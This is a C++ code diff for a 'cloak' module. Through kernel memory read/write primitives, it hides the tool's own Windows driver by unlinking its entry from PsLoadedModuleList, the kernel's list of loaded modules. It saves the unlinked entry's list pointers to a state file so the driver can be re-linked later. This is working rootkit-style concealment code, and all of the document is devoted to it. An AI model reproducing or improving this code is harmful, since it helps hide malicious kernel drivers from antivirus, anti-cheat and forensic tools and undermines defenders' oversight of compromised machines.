@@ -3,6 +3,7 @@
 #include <windows.h>
 #include <cstring>
 #include <cstdlib>
+#include <cstdio>
 #include <string>
 #include <vector>
 
@@ -10,11 +11,56 @@ namespace cloak {
 
 namespace {
 
-uint64_t g_head{};      // PsLoadedModuleList head VA
-uint64_t g_our_base{};  // Our driver's DllBase
-bool     g_on{};        // cloak active state
-
+uint64_t g_head{};
+uint64_t g_our_base{};
+bool     g_on{};
 std::string g_driver_name;
+
+constexpr uint32_t kStateMagic = 0x4B4C4F43;
+constexpr uint32_t kStateVer   = 1;
+struct State {
+    uint32_t magic, ver;
+    uint64_t entry, prev, next, ntos, eprocess;
+};
+
+bool state_path(wchar_t* out, size_t cch) {
+    wchar_t exe[MAX_PATH]{};
+    const DWORD n = GetModuleFileNameW(nullptr, exe, MAX_PATH);
+    if (!n || n >= MAX_PATH) return false;
+    wchar_t* slash = wcsrchr(exe, L'\\');
+    if (!slash) return false;
+    *(slash + 1) = 0;
+    return swprintf(out, cch, L"%scloak.state", exe) > 0;
+}
+
+bool save_state(const State& s) {
+    wchar_t p[MAX_PATH]{};
+    if (!state_path(p, MAX_PATH)) return false;
+    HANDLE h = CreateFileW(p, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
+                           FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (h == INVALID_HANDLE_VALUE) return false;
+    DWORD w = 0;
+    WriteFile(h, &s, sizeof(s), &w, nullptr);
+    CloseHandle(h);
+    return w == sizeof(s);
+}
+
+bool load_state(State& s) {
+    wchar_t p[MAX_PATH]{};
+    if (!state_path(p, MAX_PATH)) return false;
+    HANDLE h = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ, nullptr,
+                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (h == INVALID_HANDLE_VALUE) return false;
+    DWORD r = 0;
+    const bool ok = ReadFile(h, &s, sizeof(s), &r, nullptr) && r == sizeof(s);
+    CloseHandle(h);
+    return ok && s.magic == kStateMagic && s.ver == kStateVer;
+}
+
+void drop_state() {
+    wchar_t p[MAX_PATH]{};
+    if (state_path(p, MAX_PATH)) DeleteFileW(p);
+}
 
 const char* driver_image() {
     if (!g_driver_name.empty()) return g_driver_name.c_str();
@@ -68,45 +114,46 @@ bool find_head(uint64_t& head) {
 }
 
 bool find_our_driver() {
-    if (!g_head) {
-        if (!find_head(g_head)) return false;
-    }
+    if (!g_head && !find_head(g_head)) return false;
+
     const char* want = driver_image();
     if (!want || !*want) return false;
 
-    wchar_t our_w[128]{};
-    size_t len = strlen(want);
-    for (size_t i = 0; i < len && i < 127; ++i) our_w[i] = static_cast<wchar_t>(want[i]);
+    char lwant[128]{};
+    for (size_t i = 0; want[i] && i < sizeof(lwant) - 1; ++i)
+        lwant[i] = (want[i] >= 'A' && want[i] <= 'Z') ? static_cast<char>(want[i] + 32) : want[i];
+    const size_t wl = strlen(lwant);
 
     uint64_t flink{};
     if (!vmm::kread_trusted(g_head, &flink, 8)) return false;
     uint64_t cur = flink;
-    while (cur != g_head && cur != 0) {
-        uint64_t dll_base{};
+    for (int guard = 0; cur && cur != g_head && guard < 4096; ++guard) {
+        uint64_t dll_base{}, cur_flink{}, name_buf{};
+        uint16_t nlen{};
         if (!vmm::kread_trusted(cur + 0x30, &dll_base, 8)) break;
-        uint64_t cur_flink{};
         if (!vmm::kread_trusted(cur, &cur_flink, 8)) break;
-        uint64_t name_buf{};
+        if (!vmm::kread_trusted(cur + 0x58, &nlen, 2)) break;
         if (!vmm::kread_trusted(cur + 0x60, &name_buf, 8)) break;
-        if (!name_buf || name_buf < 0xFFFF800000000000ull) break;
-        wchar_t wname[128]{};
-        if (!vmm::kread_trusted(name_buf, wname, sizeof(wname) - 2)) break;
-        size_t blen = 0;
-        while (blen < 127 && wname[blen]) blen++;
-        size_t start = blen;
-        while (start > 0 && wname[start - 1] != L'\\' && wname[start - 1] != L'/') --start;
-        bool match = true;
-        size_t j = 0;
-        for (size_t i = start; i < blen && our_w[i]; ++i, ++j) {
-            wchar_t c1 = wname[i];
-            wchar_t c2 = our_w[i];
-            if (c1 >= L'A' && c1 <= L'Z') c1 = static_cast<wchar_t>(c1 + 32);
-            if (c2 >= L'A' && c2 <= L'Z') c2 = static_cast<wchar_t>(c2 + 32);
-            if (c1 != c2) { match = false; break; }
-        }
-        if (match && our_w[j] == 0) {
-            g_our_base = dll_base;
-            return true;
+
+        if (name_buf >= 0xFFFF800000000000ull && nlen > 3 && nlen < 512) {
+            wchar_t wname[256]{};
+            const int chars = nlen / 2;
+            if (chars < 255 && vmm::kread_trusted(name_buf, wname, nlen)) {
+                char aname[256]{};
+                for (int i = 0; i < chars; ++i)
+                    aname[i] = wname[i] < 128 ? static_cast<char>(wname[i]) : '?';
+                const char* tail = aname;
+                for (const char* p = aname; *p; ++p)
+                    if (*p == '\\' || *p == '/') tail = p + 1;
+                char ltail[128]{};
+                for (size_t i = 0; tail[i] && i < sizeof(ltail) - 1; ++i)
+                    ltail[i] = (tail[i] >= 'A' && tail[i] <= 'Z')
+                             ? static_cast<char>(tail[i] + 32) : tail[i];
+                if (strlen(ltail) == wl && memcmp(ltail, lwant, wl) == 0) {
+                    g_our_base = dll_base;
+                    return true;
+                }
+            }
         }
         cur = cur_flink;
     }
@@ -115,14 +162,8 @@ bool find_our_driver() {
 
 } // namespace
 
-// Locate our driver's DllBase and SizeOfImage while the KLDR entry is still
-// linked. SizeOfImage is read from the image's own PE header:
-//   e_lfanew at base+0x3C, then SizeOfImage at optional-header offset 0x38,
-//   i.e. base + lfanew + 0x50.
 bool module_base(uint64_t& base, uint32_t& size) {
-    if (g_our_base == 0) {
-        if (!find_our_driver()) return false;
-    }
+    if (g_our_base == 0 && !find_our_driver()) return false;
     uint16_t mz{};
     if (!vmm::kread_trusted(g_our_base, &mz, 2) || mz != 0x5A4D) return false;
     uint32_t lfanew{};
@@ -137,68 +178,129 @@ bool module_base(uint64_t& base, uint32_t& size) {
 }
 
 bool apply(bool commit) {
-    if (!g_on) return false;
-    if (!g_head) {
-        if (!find_head(g_head)) return false;
+    if (!g_on) {
+        printf("[!] cloak not initialised\n");
+        return false;
     }
-    if (g_our_base == 0) {
-        if (!find_our_driver()) {
-            printf("[!] our driver's KLDR_DATA_TABLE_ENTRY not found\n");
-            return false;
-        }
+    if (!g_head && !find_head(g_head)) {
+        printf("[!] PsLoadedModuleList head not found\n");
+        return false;
     }
+    if (g_our_base == 0 && !find_our_driver()) {
+        printf("[!] our driver's KLDR_DATA_TABLE_ENTRY not found (image '%s')\n",
+               driver_image());
+        return false;
+    }
+
     uint64_t flink{};
     if (!vmm::kread_trusted(g_head, &flink, 8)) return false;
     uint64_t cur = flink;
-    while (cur != g_head && cur != 0) {
-        uint64_t dll_base{};
-        uint64_t cur_flink{};
+    for (int guard = 0; cur && cur != g_head && guard < 4096; ++guard) {
+        uint64_t dll_base{}, cur_flink{};
         if (!vmm::kread_trusted(cur + 0x30, &dll_base, 8)) break;
         if (!vmm::kread_trusted(cur, &cur_flink, 8)) break;
-        if (dll_base == g_our_base) {
-            uint64_t cur_blink{};
-            if (!vmm::kread_trusted(cur + 8, &cur_blink, 8)) return false;
-            if (!commit) {
-                printf("[*] dry run: would unlink driver entry at 0x%llx (DllBase=0x%llx)\n",
-                       (unsigned long long)cur, (unsigned long long)dll_base);
-                return true;
-            }
-            if (!vmm::kwrite_trusted(cur_blink, &cur_flink, 8)) return false;
-            if (!vmm::kwrite_trusted(cur_flink + 8, &cur_blink, 8)) return false;
-            g_on = false;
-            printf("[+] driver unlinked from PsLoadedModuleList\n");
+        if (dll_base != g_our_base) { cur = cur_flink; continue; }
+
+        uint64_t cur_blink{};
+        if (!vmm::kread_trusted(cur + 8, &cur_blink, 8)) return false;
+
+        printf("[*] entry 0x%llx DllBase 0x%llx prev 0x%llx next 0x%llx\n",
+               (unsigned long long)cur, (unsigned long long)dll_base,
+               (unsigned long long)cur_blink, (unsigned long long)cur_flink);
+
+        if (!commit) {
+            printf("[*] dry run - nothing written\n");
             return true;
         }
-        cur = cur_flink;
+        if (cur_blink < 0xFFFF800000000000ull || cur_flink < 0xFFFF800000000000ull) {
+            printf("[!] neighbour is not a kernel VA\n");
+            return false;
+        }
+
+        if (!vmm::kwrite_trusted(cur_blink, &cur_flink, 8)) {
+            printf("[!] write prev->Flink failed\n");
+            return false;
+        }
+        if (!vmm::kwrite_trusted(cur_flink + 8, &cur_blink, 8)) {
+            printf("[!] write next->Blink failed\n");
+            return false;
+        }
+
+        uint64_t a{}, b{};
+        if (!vmm::kread_trusted(cur_blink, &a, 8) || !vmm::kread_trusted(cur_flink + 8, &b, 8) ||
+            a != cur_flink || b != cur_blink) {
+            printf("[!] read-back does not show an unlinked list\n");
+            return false;
+        }
+
+        const State s{ kStateMagic, kStateVer, cur, cur_blink, cur_flink,
+                       vmm::g_ntos, vmm::g_eprocess };
+        save_state(s);
+        g_on = false;
+        printf("[+] driver unlinked from PsLoadedModuleList (state saved)\n");
+        return true;
     }
     printf("[!] our driver's entry not found in PsLoadedModuleList\n");
     return false;
 }
 
 bool restore() {
-    g_on = false;
+    State s{};
+    if (!load_state(s)) {
+        printf("[!] no cloak.state next to the exe\n");
+        return false;
+    }
+    if (s.ntos != vmm::g_ntos || s.eprocess != vmm::g_eprocess) {
+        printf("[!] cloak.state belongs to another boot (ntos 0x%llx vs 0x%llx)\n",
+               (unsigned long long)s.ntos, (unsigned long long)vmm::g_ntos);
+        return false;
+    }
+    if (s.entry < 0xFFFF800000000000ull || s.prev < 0xFFFF800000000000ull ||
+        s.next < 0xFFFF800000000000ull) {
+        printf("[!] state holds a non-kernel address\n");
+        return false;
+    }
+
+    uint64_t pf{}, nb{};
+    if (!vmm::kread_trusted(s.prev, &pf, 8) || !vmm::kread_trusted(s.next + 8, &nb, 8)) return false;
+
+    if (pf == s.entry && nb == s.entry) {
+        printf("[*] list already re-linked - clearing state\n");
+        drop_state();
+        return true;
+    }
+
+    if (pf == s.next) {
+        if (!vmm::kwrite_trusted(s.next + 8, &s.prev, 8)) return false;
+    } else if (nb == s.prev) {
+        if (!vmm::kwrite_trusted(s.prev, &s.next, 8)) return false;
+    }
+
+    if (!vmm::kwrite_trusted(s.prev, &s.entry, 8)) return false;
+    if (!vmm::kwrite_trusted(s.next + 8, &s.entry, 8)) return false;
+
+    uint64_t a{}, b{};
+    if (!vmm::kread_trusted(s.prev, &a, 8) || !vmm::kread_trusted(s.next + 8, &b, 8) ||
+        a != s.entry || b != s.entry) {
+        printf("[!] read-back does not show a re-linked list\n");
+        return false;
+    }
+    drop_state();
+    printf("[+] driver re-linked\n");
     return true;
 }
 
-bool active() {
-    return g_on;
-}
+bool active() { return g_on; }
 
 void set_driver_image(const char* name) {
     if (name && *name) g_driver_name = name;
 }
 
 bool cloak_init(const char* driver_image_name) {
-    if (driver_image_name && *driver_image_name) {
-        g_driver_name = driver_image_name;
-    }
+    if (driver_image_name && *driver_image_name) g_driver_name = driver_image_name;
     g_our_base = 0;
     g_on = true;
     return true;
-}
-
-bool hide_symlink(const wchar_t* link) {
-    return false;
 }
 
 } // namespace cloak
